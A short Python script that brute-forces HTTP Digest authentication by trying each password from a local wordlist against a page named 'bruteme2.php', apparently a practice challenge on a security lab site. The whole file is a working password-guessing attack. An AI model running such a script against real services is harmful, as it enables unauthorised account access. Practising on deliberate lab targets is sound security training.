import requests
from requests.auth import HTTPDigestAuth


with open('C:/Users/Sadness/Desktop/for_security/passwords.txt', 'r') as f:
    for i in f.readlines():
        passwd = i.strip('\n')
        r = requests.get('https://labs.forensics.su/bruteme2.php', auth = HTTPDigestAuth('sadness18', passwd))
        if (r.status_code == 200):
            print('Password: ', i)
            break
        elif (r.status_code == 401):
            print('incorrect password: ', passwd)
